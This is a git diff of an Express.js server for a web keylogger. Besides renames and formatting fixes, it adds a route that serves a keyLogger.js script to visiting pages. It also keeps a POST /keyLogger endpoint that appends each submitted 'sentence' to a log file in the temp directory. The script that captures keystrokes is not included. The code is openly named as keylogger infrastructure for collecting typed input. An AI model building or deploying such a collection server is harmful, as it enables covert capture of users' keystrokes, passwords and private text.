@@ -5,7 +5,7 @@ const bodyParser = require('body-parser');
 
 const tempDir = require('os').tmpdir();
 
-const logFileName = 'Keylogger.log';
+const logFileName = 'KeyLogger.log';
 
 var logFile = path.join(tempDir, logFileName)
 
@@ -18,13 +18,17 @@ app.use(bodyParser.json()); // support json encoded bodies
 app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies
 
 app.get('/', function (req, res) {
-  res.sendFile(path.join(__dirname, 'index.html'));
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-app.post('/keylogger', function (req, res) {
-    var data = req.body.sentence + '\n';    
+app.get('/keyLogger.js', function (req, res) {
+    res.sendFile(path.join(__dirname, 'keyLogger.js'));
+});
+
+app.post('/keyLogger', function (req, res) {
+    var data = req.body.sentence + '\n';
     fs.appendFile(logFile, data, error => {
-        if(error)
+        if (error)
             res.sendStatus(500);
         else
             res.sendStatus(200);
